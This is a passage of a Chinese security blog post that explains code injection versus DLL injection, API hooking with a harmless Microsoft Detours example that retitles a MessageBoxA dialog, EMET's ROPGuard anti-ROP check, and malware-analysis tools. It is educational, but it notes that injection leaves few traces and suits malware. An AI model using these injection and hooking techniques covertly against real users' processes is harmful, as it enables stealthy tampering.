  <p>在Windows中，只要拥有足够的权限，就可以随意访问其他进程的内存空间，基本可以自由地向其他进程注入代码，而且即便程序不是调试器，也可以比较容易地骗过其他的进程。</p>
</blockquote>

<p><strong>代码注入要实现的功能和DLL注入类似，但代码注入的优点如下：</strong></p>
<ul>
  <li><strong>占用内存少</strong></li>
  <li>
    <p>若注入的数据或代码比较少，直接采用代码注入可达到效果，且占用内存比较少</p>
  </li>
  <li><strong>难以查找痕迹</strong></li>
  <li>
    <p>采用DLL注入会在目标进程中留下相关痕迹，很容易被判断出目标进程是否执行过注入操作。采用代码注入几乎不会留下任何痕迹，所以恶意代码中大量使用代码注入</p>
  </li>
  <li><strong>其他</strong></li>
</ul>

<p><strong>DLL注入技术主要用于在代码量大且复杂的时候，而代码注入技术则适用于代码量小且简单的情况</strong></p>

<h2 id="api钩子">API钩子</h2>

<p>在程序中插入额外的逻辑称为“钩子”，而其中对API插入额外逻辑称为“API钩子”。钩子是一种截取信息、更改程序执行流向、添加新功能的技术。</p>

<p>API钩子大体分为两种：</p>
<ul>
  <li>改写目标函数开头几个字节</li>
  <li>改写IAT(导入表)</li>
</ul>

<blockquote>
  <p>IAT型钩子详细可见<a href="https://www.amazon.com/dp/1572315482">Advanced Windows</a></p>
</blockquote>

<p>API钩子技术图表：
<img src="/img/interestingBin/1491403435120.png" alt="API钩子技术图表" /></p>

<h3 id="用detours实现一个简单的api钩子">用Detours实现一个简单的API钩子</h3>

<p>使用<a href="https://www.microsoft.com/en-us/research/project/detours/">Detours</a>的API钩子库可以用少量代码实现API钩子。只要知道DLL所导出的函数，就可以在运行时对该函数的调用进行劫持。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//detourshook.h
</span><span class="cp">#ifdef DETOURSHOOK_EXPORTS
#define DETOURSHOOK_API __declspec(dllexport)
#else
#define DETOURSHOOK_API __declspec(dllimport)
#endif
</span>
<span class="n">DETOURSHOOK_API</span> <span class="kt">int</span> <span class="n">WINAPI</span> <span class="n">HookedMessageBoxA</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hWnd</span><span class="p">,</span> 
	<span class="n">LPCTSTR</span> <span class="n">lpText</span><span class="p">,</span> <span class="n">LPCTSTR</span> <span class="n">lpCaption</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">uType</span><span class="p">);</span>
</code></pre></div></div>

<p>以下代码可以将<code class="highlighter-rouge">user32.dll</code>导出的函数<code class="highlighter-rouge">MessageBoxA</code>替换成<code class="highlighter-rouge">HookedMessageBoxA</code>。</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// dllmain.cpp
//

#include "stdafx.h"
#include "detours.h"
#include "detourshook.h"


static int (WINAPI * TrueMessageBoxA)(HWND hWnd, LPCTSTR lpText, 
	LPCTSTR lpCaption, UINT uType) = MessageBoxA;

DETOURSHOOK_API int WINAPI HookedMessageBoxA(HWND hWnd, 
	LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)
{
	int nRet = TrueMessageBoxA(hWnd, lpText, "Hooked Message", uType);
	return nRet;
}


int DllProcessAttach(VOID)
{
	DetourRestoreAfterWith();
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&amp;(PVOID&amp;)TrueMessageBoxA, HookedMessageBoxA);	
	if(DetourTransactionCommit() == NO_ERROR)
		return -1;
	return 0;
}


int DllProcessDetach(VOID)
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&amp;(PVOID&amp;)TrueMessageBoxA, HookedMessageBoxA);
	DetourTransactionCommit();
	return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DllProcessAttach();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		DllProcessDetach();
		break;
	}
	return TRUE;
}
</code></pre></div></div>

<p>将以下文件添加到工程中，并编译：
<img src="/img/interestingBin/1491390313942.png" alt="代码文件" /></p>

<p>当DLLMain收到<code class="highlighter-rouge">DLL_PROCESS_ATTACH</code>消息时，会调用<code class="highlighter-rouge">DllProcessAttach()</code>函数。即，当DLL被加载到进程中时，API钩子就开始生效。
<code class="highlighter-rouge">DllProcessAttach</code>用于挂载钩子，<code class="highlighter-rouge">DllProcessDetach</code>用于解除钩子。
在函数内部，会先调用<code class="highlighter-rouge">DetourTransactionBegin</code>和<code class="highlighter-rouge">DetourUpdateThread</code>,然后再用<code class="highlighter-rouge">DetourAttach</code>或者<code class="highlighter-rouge">DetcourDetach</code>来挂载或解除钩子。
最后，程序调用<code class="highlighter-rouge">DetourTransactionCommit</code>函数并退出。</p>

<h3 id="修改消息框的标题栏">修改消息框的标题栏</h3>
<p><code class="highlighter-rouge">HookedMessageBoxA</code>函数的内部会调用<code class="highlighter-rouge">TrueMessageBoxA</code>，也就是原始的<code class="highlighter-rouge">MessageBoxA</code>函数。</p>

<p>为了确认<code class="highlighter-rouge">HookedMessageBoxA</code>确实被调用过，可以将消息框标题栏改为“Hooked Message”。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// helloworld.cpp
</span>
<span class="cp">#include "stdafx.h"
#include &lt;Windows.h&gt;
</span>

<span class="kt">int</span> <span class="nf">_tmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">_TCHAR</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
	<span class="n">HMODULE</span> <span class="n">h</span> <span class="o">=</span> <span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"detourshook.dll"</span><span class="p">);</span>
	<span class="n">MessageBoxA</span><span class="p">(</span><span class="n">GetForegroundWindow</span><span class="p">(),</span> 
		<span class="s">"Hello World! using MessageBoxA"</span><span class="p">,</span> <span class="s">"Message"</span><span class="p">,</span> <span class="n">MB_OK</span><span class="p">);</span>
	<span class="n">FreeLibrary</span><span class="p">(</span><span class="n">h</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>
<p><img src="/img/interestingBin/1491390958676.png" alt="标题栏变成&quot;Hooked Message&quot;" /></p>

<p>根据环境和对象文件不同，API钩子也有各种各样的实现方法，<code class="highlighter-rouge">Detours</code>是一种非常简单的方法来实现的，详情可见<a href="https://www.cs.columbia.edu/~junfeng/10fa-e6998/papers/detours.pdf">Detours: Binary Interception of Win32 Functions </a>.</p>

<p><strong>钩子的原理是将函数开头的几个字节替换成jmp指令，强制跳转到另一个函数。</strong></p>

<blockquote>
  <p>以上所讲API钩子技术基本只适用于用户级的DLL所导出的函数，但也可以通过劫持非公开的API等方式，对运行在内核领域(Ring0)的驱动程序挂载钩子。</p>
</blockquote>

<h2 id="观察反rop机制">观察反ROP机制</h2>
<p>EMET全称为<a href="https://support.microsoft.com/en-us/help/2458544/the-enhanced-mitigation-experience-toolkit">Enhanced Mitigation Experience Toolkit</a>（增强减灾体验工具），是微软发布的免费漏洞缓解工具。EMET通过使用安全缓解技术，防止软件中的漏洞被成功利用。这些安全缓解技术不能保证漏洞不被利用。但是它使得利用变得困难。
EMET还提供了可配置的SSL / TLS证书固定功能打到证书信任。此功能旨在检测利用公钥（PKI）进行中间人攻击的攻击。</p>

<p>v3.5版本开始新增反ROP(Anti-ROP)机制</p>

<h3 id="ropguard">ROPGuard</h3>

<p>ROPGuard是一种检查“RETN所返回的目标有没有相对应的CALL”(即CALL-RETN匹配性)的机制，方案简单，却能有效监测出Return-into-libc和ROP攻击</p>

<p>CALL用来调用子程序，而在子程序的结尾，（大部分情况下）都会执行RETN，而子程序结尾的RETN所返回的目标地址，应该就是CALL指令的下面一条指令。
然而在Return-into-libc攻击中，RETN会跳转到函数的开头，而ROP攻击中则使用了非常多的RETN，这些都会导致出现“RETN并不是返回CALL的下一条指令”的情况。</p>

<p>因此，该方案的本质在于关注CALL和RETN的匹配性(调用栈回溯)，以此来检测ROP和Return-into-libc攻击。</p>

<h2 id="分析恶意软件">分析恶意软件</h2>

<ul>
  <li>REMnux分析恶意软件:<a href="https://remnux.org/">REMnux</a>是一个用于分析恶意软件操作的OS，基于Ubuntu开发</li>
  <li>ClamAV检测恶意软件和漏洞攻击</li>
  <li>用Zero Wine Tryouts分析恶意软件</li>
</ul>

<blockquote>
  <p>Zero Wine Tryouts是一个开源的自动分析工具，只要将文件上传上去就可以显示结果。与REMnux不同点在于，它主要通过动态分析来得出结果。</p>
</blockquote>

        </article>
        <hr>

        
        
            
            
                
                    
                
                    
                        
                        <h2 id="similar_posts">Similar Posts</h2>
                        <ul>
                        
                        <li class="relatedPost">
                            <a href="/2018/02/08/Shodan-Manual/">Shodan手册
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2018/01/27/hidden-the-network/">阻碍获取真实网络指纹
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2018/01/04/command-and-control-images/">command-and-control-images
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/12/27/open-RDP/">开启RDP
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/11/30/Test-LAB-11/">TEST LAB 11
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/11/29/proxy/">代理
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
        
            </ul>
        

        <div class="post-recent">
    <div class="pre">
        
        <p><strong>上一篇</strong> <a href="/2017/04/05/one-click-infection/">一键无文件感染</a></p>
        
    </div>
    <div class="nex">

        
        <p><strong>下一篇</strong> <a href="/2017/04/10/PE-expansion/">PE(二)</a></p>
        
    </div>
</div>


        <h2 id="comments">Comments</h2>
        


<div id="disqus_thread"></div>
<script>
    /**
     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */

    var disqus_config = function() {
        this.page.url = 'http://localhost:4000/2017/04/06/interesting-bin/'; // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'http://localhost:4000/2017/04/06/interesting-bin/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };

    (function() { // DON'T EDIT BELOW THIS LINE
        var d = document,
            s = d.createElement('script');

        s.src = '//http-b404-xyz.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




    </div>
    <button class="anchor"><i class="fa fa-anchor"></i></button>
    <div class="right">
        <div class="wrap">

            <!-- Content -->
            <div class="side content">
                <div>
                    Content
                </div>
                <ul id="content-side" class="content-ul">
                    
                    <li><a href="#similar_posts">Similar Posts</a></li>
                    
                    <li><a href="#comments">Comments</a></li>
                </ul>
            </div>
            <!-- 其他div框放到这里 -->
            <!-- <div class="side">bbbb</div> -->
        </div>
    </div>
</div>
<script>
/**
 * target _blank
 */
(function() {
    var aTags = document.querySelectorAll('article a:not([id])')
    for (var i = 0; i < aTags.length; i++) {
        aTags[i].setAttribute('target', '_blank')
    }
}());
</script>
<script src="/js/pageContent.js " charset="utf-8"></script>


    <footer class="site-footer">


    <div class="wrapper">

        <p class="description">
             The quieter you become, the more you can hear. 
        </p>

        <br>
        <p class="contact">
             
            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
            
        </p>
        <!--
        <p>
            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
        </p>
    -->
        <p class="power">
            <span>
                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
            </span>
        </p>
    </div>
</footer>
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <div class="back-to-top">
    <a href="#top" data-scroll>
        <i class="fa fa-arrow-up" aria-hidden="true"></i>
    </a>
</div>

    <script src=" /js/main.js " charset="utf-8"></script>
    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
    <script type="text/javascript">
      smoothScroll.init({
        speed: 500, // Integer. How fast to complete the scroll in milliseconds
        easing: 'easeInOutCubic', // Easing pattern to use
        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
      });
    </script>
    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
  </body>

</html>
